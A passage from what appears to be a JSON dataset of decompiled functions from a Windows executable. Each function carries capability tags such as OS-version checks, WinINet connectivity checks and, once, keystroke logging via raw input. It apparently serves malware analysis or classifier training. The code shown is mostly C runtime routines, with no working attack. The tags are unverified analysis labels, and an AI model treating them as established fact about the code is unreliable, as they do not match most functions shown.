0x2d;\n                    }\n                    if (99 < iVar3) {\n                        iVar4 = iVar3 / 100;\n                        iVar3 = iVar3 % 100;\n                        puVar6[2] = puVar6[2] + iVar4;\n                    }\n                    if (9 < iVar3) {\n                        iVar4 = iVar3 / 10;\n                        iVar3 = iVar3 % 10;\n                        puVar6[3] = puVar6[3] + iVar4;\n                    }\n                    puVar6[4] = puVar6[4] + iVar3;\n                }\n                if (((*0x413540 & 1) != 0) && (puVar6[2] == '0')) {\n                    fcn.00406d80(puVar6 + 2, puVar6 + 3, 3);\n                }\n                if (var_4h != '\\0') {\n                    *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n                }\n                return 0;\n            }\n            fcn.004034cf(0, 0, 0, 0, 0);\n            pcVar1 = swi(3);\n            uVar7 = (*pcVar1)();\n            return uVar7;\n        }\n        puVar2 = fcn.00403a1e();\n        uVar7 = 0x22;\n    }\n    *puVar2 = uVar7;\n    fcn.00403521();\n    if (var_4h != '\\0') {\n        *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n    }\n    return uVar7;\n}\n",
        "token_count": 938
    },
    "00402860": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00402860(uint32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int16_t iVar3;\n    uint16_t uVar4;\n    int32_t *piVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    int16_t iVar10;\n    char *pcVar11;\n    char *pcVar12;\n    bool bVar13;\n    int32_t iVar14;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = 0x3ff;\n    iVar1 = 0x30;\n    fcn.004023de(arg_1ch);\n    if (arg_14h < 0) {\n        arg_14h = 0;\n    }\n    if ((arg_ch == NULL) || (arg_10h == 0)) {\n        piVar5 = fcn.00403a1e();\n        iVar14 = 0x16;\ncode_r0x0040289b:\n        *piVar5 = iVar14;\n        fcn.00403521();\n        if (var_18h != '\\0') {\n            *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n        }\n        return iVar14;\n    }\n    *arg_ch = 0;\n    if (arg_10h <= arg_14h + 0xbU) {\n        piVar5 = fcn.00403a1e();\n        iVar14 = 0x22;\n        goto code_r0x0040289b;\n    }\n    if ((arg_8h[1] >> 0x14 & 0x7ff) == 0x7ff) {\n        if (arg_10h != 0xffffffff) {\n            arg_10h = arg_10h - 2;\n        }\n        iVar14 = fcn.00402840(arg_8h, arg_ch + 2, arg_10h, arg_14h, 0);\n        if (iVar14 != 0) {\n            *arg_ch = 0;\n            if (var_18h == '\\0') {\n                return iVar14;\n            }\n            *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            return iVar14;\n        }\n        if (arg_ch[2] == '-') {\n            *arg_ch = 0x2d;\n            arg_ch = arg_ch + 1;\n        }\n        *arg_ch = 0x30;\n        arg_ch[1] = ((arg_18h == 0) - 1U & 0xe0) + 0x78;\n        pcVar6 = fcn.00406020(arg_ch + 2, 0x65);\n        if (pcVar6 != NULL) {\n            *pcVar6 = ((arg_18h == 0) - 1U & 0xe0) + 0x70;\n            pcVar6[3] = '\\0';\n        }\n        goto code_r0x00402bc2;\n    }\n    if ((arg_8h[1] & 0x80000000) != 0) {\n        *arg_ch = 0x2d;\n        arg_ch = arg_ch + 1;\n    }\n    *arg_ch = 0x30;\n    arg_ch[1] = ((arg_18h == 0) - 1U & 0xe0) + 0x78;\n    iVar10 = (-(arg_18h != 0) & 0xffe0) + 0x27;\n    if ((arg_8h[1] & 0x7ff00000) == 0) {\n        arg_ch[2] = 0x30;\n        if ((*arg_8h | arg_8h[1] & 0xfffff) == 0) {\n            var_14h = 0;\n        }\n        else {\n            var_14h = 0x3fe;\n        }\n    }\n    else {\n        arg_ch[2] = 0x31;\n    }\n    pcVar12 = arg_ch + 3;\n    pcVar6 = arg_ch + 4;\n    if (arg_14h == 0) {\n        *pcVar12 = '\\0';\n    }\n    else {\n        *pcVar12 = ***(var_24h + 0xbc);\n    }\n    if (((arg_8h[1] & 0xfffff) != 0) || (*arg_8h != 0)) {\n        do {\n            if (arg_14h < 1) break;\n            iVar3 = fcn.00407530();\n            uVar4 = iVar3 + 0x30;\n            if (0x39 < uVar4) {\n                uVar4 = uVar4 + iVar10;\n            }\n            iVar1 = iVar1 + -4;\n            *pcVar6 = uVar4;\n            pcVar6 = pcVar6 + 1;\n            arg_14h = arg_14h + -1;\n        } while (-1 < iVar1);\n        if ((-1 < iVar1) && (uVar4 = fcn.00407530(),  pcVar11 = pcVar6,  8 < uVar4)) {\n            while( true ) {\n                pcVar7 = pcVar11 + -1;\n                if ((*pcVar7 != 'f') && (*pcVar7 != 'F')) break;\n                *pcVar7 = '0';\n                pcVar11 = pcVar7;\n            }\n            if (pcVar7 == pcVar12) {\n                pcVar11[-2] = pcVar11[-2] + '\\x01';\n            }\n            else if (*pcVar7 == '9') {\n                *pcVar7 = iVar10 + ':';\n            }\n            else {\n                *pcVar7 = *pcVar7 + '\\x01';\n            }\n        }\n    }\n    if (0 < arg_14h) {\n        fcn.004074b0(pcVar6, 0x30, arg_14h);\n        pcVar6 = pcVar6 + arg_14h;\n    }\n    if (*pcVar12 == '\\0') {\n        pcVar6 = pcVar12;\n    }\n    *pcVar6 = ((arg_18h == 0) - 1U & 0xe0) + 0x70;\n    uVar8 = fcn.00407530();\n    uVar9 = (uVar8 & 0x7ff) - var_14h;\n    uVar8 = (uVar8 & 0x7ff) < var_14h;\n    iVar14 = -uVar8;\n    if (uVar8 == 0) {\n        pcVar6[1] = '+';\n    }\n    else {\n        pcVar6[1] = '-';\n        bVar13 = uVar9 != 0;\n        uVar9 = -uVar9;\n        iVar14 = -(iVar14 + bVar13);\n    }\n    pcVar11 = pcVar6 + 2;\n    *pcVar11 = '0';\n    pcVar12 = pcVar11;\n    if ((iVar14 < 0) || ((iVar14 < 1 && (uVar9 < 1000)))) {\ncode_r0x00402b71:\n        if ((-1 < iVar14) && ((0 < iVar14 || (99 < uVar9)))) goto code_r0x00402b7c;\n    }\n    else {\n        cVar2 = fcn.004073d0(uVar9, iVar14, 1000, 0);\n        *pcVar11 = cVar2 + '0';\n        pcVar12 = pcVar6 + 3;\n        iVar14 = 0;\n        uVar9 = extraout_ECX;\n        if (pcVar12 == pcVar11) goto code_r0x00402b71;\ncode_r0x00402b7c:\n        cVar2 = fcn.004073d0(uVar9, iVar14, 100, 0);\n        *pcVar12 = cVar2 + '0';\n        pcVar12 = pcVar12 + 1;\n        iVar14 = 0;\n        uVar9 = extraout_ECX_00;\n    }\n    if ((pcVar12 != pcVar11) || ((-1 < iVar14 && ((0 < iVar14 || (9 < uVar9)))))) {\n        cVar2 = fcn.004073d0(uVar9, iVar14, 10, 0);\n        *pcVar12 = cVar2 + '0';\n        pcVar12 = pcVar12 + 1;\n        uVar9 = extraout_ECX_01;\n    }\n    *pcVar12 = uVar9 + '0';\n    pcVar12[1] = '\\0';\ncode_r0x00402bc2:\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\n    return 0;\n}\n",
        "token_count": 2148
    },
    "00402bd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402bd6(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *in_ECX;\n    uint uVar3;\n    uchar *arg_ch_00;\n    uchar *arg_8h_00;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar2 = in_EAX[1];\n    fcn.004023de(arg_14h);\n    if ((in_ECX == NULL) || (arg_8h == 0)) {\n        puVar1 = fcn.00403a1e();\n        uVar3 = 0x16;\n        *puVar1 = 0x16;\n        fcn.00403521();\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n    }\n    else {\n        if ((arg_10h != '\\0') && (iVar2 + -1 == arg_ch)) {\n            *(in_ECX + (*in_EAX == 0x2d) + iVar2 + -1) = 0x30;\n        }\n        arg_ch_00 = in_ECX;\n        if (*in_EAX == 0x2d) {\n            arg_ch_00 = in_ECX + 1;\n            *in_ECX = 0x2d;\n        }\n        if (in_EAX[1] < 1) {\n            arg_8h_00 = arg_ch_00 + 1;\n            iVar2 = fcn.004070f0(arg_ch_00);\n            fcn.00406d80(arg_8h_00, arg_ch_00, iVar2 + 1);\n            *arg_ch_00 = 0x30;\n        }\n        else {\n            arg_8h_00 = arg_ch_00 + in_EAX[1];\n        }\n        if (0 < arg_ch) {\n            iVar2 = fcn.004070f0(arg_8h_00);\n            fcn.00406d80(arg_8h_00 + 1, arg_8h_00, iVar2 + 1);\n            *arg_8h_00 = ***(var_10h + 0xbc);\n            iVar2 = in_EAX[1];\n            if (iVar2 < 0) {\n                if ((arg_10h != '\\0') || (SBORROW4(arg_ch, -iVar2) == arg_ch + iVar2 < 0)) {\n                    arg_ch = -iVar2;\n                }\n                fcn.004025d3();\n                fcn.004074b0(arg_8h_00 + 1, 0x30, arg_ch);\n            }\n        }\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 721
    },
    "00402f86": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint fcn.00402f86(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    \n    do {\n        if (*(unaff_ESI * 8 + 0x411b3c) == 1) {\n            piVar1 = unaff_ESI * 8 + 0x411b38;\n            *piVar1 = unaff_EDI;\n            unaff_EDI = unaff_EDI + 0x18;\n            iVar2 = (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(*piVar1, 4000);\n            if (iVar2 == 0) {\n                *(unaff_ESI * 8 + 0x411b38) = 0;\n                return 0;\n            }\n        }\n        unaff_ESI = unaff_ESI + 1;\n    } while (unaff_ESI < 0x24);\n    return 1;\n}\n",
        "token_count": 222
    },
    "0040333d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040333d(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040301e(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "004042f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042f2(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    \n    arg_8h_00 = fcn.00408222(arg_8h);\n    iVar2 = fcn.004081cc(arg_8h_00);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = fcn.0040413d();\n    if (arg_8h == iVar2 + 0x20) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.0040413d();\n        if (arg_8h != iVar2 + 0x40) {\n            return 0;\n        }\n        iVar2 = 1;\n    }\n    *0x413408 = *0x413408 + 1;\n    if ((arg_8h[3] & 0x10cU) != 0) {\n        return 0;\n    }\n    piVar1 = iVar2 * 4 + 0x41340c;\n    if (*piVar1 == 0) {\n        iVar2 = fcn.004075b7(0x1000);\n        *piVar1 = iVar2;\n        if (iVar2 == 0) {\n            arg_8h[2] = arg_8h + 5;\n            *arg_8h = arg_8h + 5;\n            arg_8h[6] = 2;\n            arg_8h[1] = 2;\n            goto code_r0x0040437b;\n        }\n    }\n    iVar2 = *piVar1;\n    arg_8h[2] = iVar2;\n    *arg_8h = iVar2;\n    arg_8h[6] = 0x1000;\n    arg_8h[1] = 0x1000;\ncode_r0x0040437b:\n    arg_8h[3] = arg_8h[3] | 0x1102;\n    return 1;\n}\n",
        "token_count": 467
    },
    "0040438e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040438e(int32_t arg_8h, uint *arg_ch)\n\n{\n    if ((arg_8h != 0) && ((arg_ch[3] & 0x1000) != 0)) {\n        fcn.00408039(arg_ch);\n        arg_ch[3] = arg_ch[3] & 0xffffeeff;\n        arg_ch[6] = 0;\n        *arg_ch = 0;\n        arg_ch[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "004043f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043f5(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t unaff_EBX;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar1 = *unaff_EDI;\n    if (((*(unaff_EBX + 0xc) & 0x40) == 0) || (*(unaff_EBX + 8) != 0)) {\n        *unaff_EDI = 0;\n        if (0 < arg_ch) {\n            do {\n                arg_ch = arg_ch + -1;\n                fcn.004043c2();\n                if (*in_EAX == -1) {\n                    if (*unaff_EDI != 0x2a) break;\n                    fcn.004043c2();\n                }\n            } while (0 < arg_ch);\n            if (*unaff_EDI != 0) {\n                return;\n            }\n        }\n        *unaff_EDI = iVar1;\n    }\n    else {\n        *in_EAX = *in_EAX + arg_ch;\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "0040505f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040505f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x413520, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00403a1e();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.004039dc(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00405099": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405099(uint arg_8h, char *arg_ch, char **arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *arg_8h_00;\n    char *pcVar5;\n    int32_t iVar6;\n    char **ppcVar7;\n    char *pcVar8;\n    char *arg_ch_00;\n    bool bVar9;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    pcVar8 = NULL;\n    arg_ch_00 = NULL;\n    var_4h = NULL;\n    if ((arg_ch == NULL) || (*arg_ch == '\\0')) {\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 0x16;\n        fcn.00403521();\n        var_ch = -1;\n    }\n    else if (((arg_10h == NULL) || (*arg_10h == NULL)) || (**arg_10h == '\\0')) {\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 0x16;\n        fcn.00403521();\n        var_ch = -1;\n    }\n    else {\n        puVar2 = fcn.00403a1e();\n        uVar1 = *puVar2;\n        puVar2 = fcn.00403a1e();\n        *puVar2 = 0;\n        var_ch = fcn.00405377(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (((var_ch == -1) && (piVar3 = fcn.00403a1e(),  *piVar3 == 2)) &&\n           (iVar4 = fcn.00408878(arg_ch, 0x2f),  iVar4 == 0)) {\n            iVar4 = fcn.00405666(&var_4h, 0, \"PATH\");\n            if (iVar4 == 0) goto code_r0x00405173;\n            if (iVar4 == 0x16) {\ncode_r0x0040516e:\n                fcn.004034cf(0);\ncode_r0x00405173:\n                if ((var_4h != pcVar8) && (arg_ch_00 = fcn.004075fc(0x104, 1),  arg_ch_00 != pcVar8)) {\n                    arg_8h_00 = fcn.00408733(var_4h, arg_ch_00, 0x103);\n                    bVar9 = arg_8h_00 == pcVar8;\n                    do {\n                        if ((bVar9) || (*arg_ch_00 == '\\0')) break;\n                        iVar4 = fcn.004070f0(arg_ch_00);\n                        pcVar8 = arg_ch_00 + iVar4 + -1;\n                        if (*pcVar8 == '\\\\') {\n                            pcVar5 = fcn.0040871c(arg_ch_00, 0x5c);\n                            if (pcVar8 != pcVar5) {\n                                fcn.00408605(arg_ch_00, 0x104, 0x40edbc);\n                            }\n                        }\n                        else if ((*pcVar8 != '/') && (iVar4 = fcn.00408605(arg_ch_00, 0x104, 0x40edbc),  iVar4 != 0))\n                        goto code_r0x0040516e;\n                        iVar4 = fcn.004070f0(arg_ch_00);\n                        iVar6 = fcn.004070f0(arg_ch);\n                        pcVar8 = iVar4 + iVar6;\n                        if (0x103 < pcVar8) {\ncode_r0x004052cf:\n                            pcVar8 = NULL;\n                            break;\n                        }\n                        iVar4 = fcn.00408605(arg_ch_00, 0x104, arg_ch);\n                        if (iVar4 != 0) goto code_r0x0040516e;\n                        puVar2 = fcn.00403a1e();\n                        *puVar2 = 0;\n                        var_ch = fcn.00405377(arg_8h, arg_ch_00, arg_10h, arg_14h);\n                        if (var_ch != -1) goto code_r0x004052cf;\n                        piVar3 = fcn.00403a1e();\n                        if ((*piVar3 != 2) && (piVar3 = fcn.00403a31(),  *piVar3 != 0x15)) {\n                            pcVar8 = fcn.00408878(arg_ch_00, 0x5c);\n                            if ((arg_ch_00 == pcVar8) || (pcVar8 = fcn.00408878(arg_ch_00, 0x2f),  arg_ch_00 == pcVar8))\n                            {\n                                pcVar8 = arg_ch_00 + 1;\n                                pcVar5 = fcn.00408878(pcVar8, 0x5c);\n                                if ((pcVar8 == pcVar5) || (pcVar5 = fcn.00408878(pcVar8, 0x2f),  pcVar8 == pcVar5))\n                                goto code_r0x004052a3;\n                            }\n                            goto code_r0x004052cf;\n                        }\ncode_r0x004052a3:\n                        arg_8h_00 = fcn.00408733(arg_8h_00, arg_ch_00, 0x103);\n                        pcVar8 = NULL;\n                        bVar9 = arg_8h_00 == NULL;\n                    } while( true );\n                }\n            }\n        }\n        ppcVar7 = fcn.00403a1e();\n        if (*ppcVar7 == pcVar8) {\n            puVar2 = fcn.00403a1e();\n            *puVar2 = uVar1;\n        }\n        if (arg_ch_00 != pcVar8) {\n            fcn.0040505f(arg_ch_00);\n        }\n        if (var_4h != pcVar8) {\n            fcn.0040505f(var_4h);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1391
    },
    "00405305": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405305(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_ch == 0) || (arg_10h == 0)) {\n        puVar1 = fcn.00403a1e();\n        *puVar1 = 0x16;\n        fcn.00403521();\n    }\n    else {\n        iVar2 = fcn.00408a93(arg_10h, arg_14h, &var_4h, &var_8h);\n        if (iVar2 != -1) {\n            uVar3 = fcn.0040888f(arg_8h, arg_ch, var_4h, var_8h);\n            fcn.0040505f(var_4h);\n            fcn.0040505f(var_8h);\n            return uVar3;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 246
    },
    "004090ff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid loc.004090ff(void)\n\n{\n    uint uVar1;\n    \n    *0x4135b0 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00407aa1(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x40f2cc);\n    if (*0x4135b0 == 0) {\n        fcn.00407aa1(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 158
    },
    "00406a6a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00406a6a(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004023de(arg_ch);\n    if (*(var_10h + 0xac) < 2) {\n        uVar1 = *(*(var_10h + 200) + arg_8h * 2) & 4;\n    }\n    else {\n        uVar1 = fcn.004099a1(arg_8h, 4, &var_10h);\n    }\n    if (var_4h != '\\0') {\n        *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n    }\n    return uVar1;\n}\n",
        "token_count": 210
    },
    "00406abb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406abb(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x41388c == 0) {\n        return *(*0x412818 + arg_8h * 2) & 4;\n    }\n    uVar1 = fcn.00406a6a(arg_8h, 0);\n    return uVar1;\n}\n",
        "token_count": 93
    },
    "00406ae9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00406ae9(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint arg_18h;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004023de(arg_ch);\n    if (arg_8h < 0x100) {\n        if (*(var_18h + 0xac) < 2) {\n            uVar1 = *(*(var_18h + 200) + arg_8h * 2) & 1;\n        }\n        else {\n            uVar1 = fcn.004099a1(arg_8h, 1, &var_18h);\n        }\n        if (uVar1 == 0) {\ncode_r0x00406b4a:\n            if (var_ch == '\\0') {\n                return arg_8h;\n            }\n            *(var_10h + 0x70) = *(var_10h + 0x70) & 0xfffffffd;\n            return arg_8h;\n        }\n        uVar1 = *(*(var_18h + 0xcc) + arg_8h);\n    }\n    else {\n        if ((*(var_18h + 0xac) < 2) || (iVar2 = fcn.0040851e(arg_8h >> 8 & 0xff, &var_18h),  iVar2 == 0)) {\n            puVar3 = fcn.00403a1e();\n            *puVar3 = 0x2a;\n            var_4h._1_1_ = 0;\n            arg_18h = 1;\n            var_4h._0_1_ = arg_8h;\n        }\n        else {\n            arg_8h._0_1_ = arg_8h >> 8;\n            var_4h._0_1_ = arg_8h;\n            var_4h._2_1_ = 0;\n            arg_18h = 2;\n            var_4h._1_1_ = arg_8h;\n        }\n        iVar2 = fcn.00409356(&var_18h, *(var_18h + 0x14), 0x100, &var_4h, arg_18h, &var_8h, 3, *(var_18h + 4), 1);\n        if (iVar2 == 0) goto code_r0x00406b4a;\n        uVar1 = var_8h;\n        if (iVar2 != 1) {\n            uVar1 = CONCAT11(var_8h, var_8h._1_1_);\n        }\n    }\n    if (var_ch != '\\0') {\n        *(var_10h + 0x70) = *(var_10h + 0x70) & 0xfffffffd;\n    }\n    return uVar1;\n}\n",
        "token_count": 690
    },
    "00406c2a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406c2a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    fcn.004023de(arg_10h);\n    var_14h = fcn.0040a4fb(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00409a59(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00406c83:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00406cc3;\n        }\n        if (iVar1 != 2) {\ncode_r0x00406cb5:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00406cc3;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00406cb5;\n        goto code_r0x00406c83;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00406cc3:\n    fcn.00405fff(unaff_EBX);\n    return;\n}\n",
        "token_count": 502
    },
    "00406cd2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406cd2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x412058 ^ &stack0xfffffffc;\n    fcn.004023de(arg_10h);\n    var_14h = fcn.0040a4fb(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00409faa(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00406d2b:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00406d6b;\n        }\n        if (iVar1 != 2) {\ncode_r0x00406d5d:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) 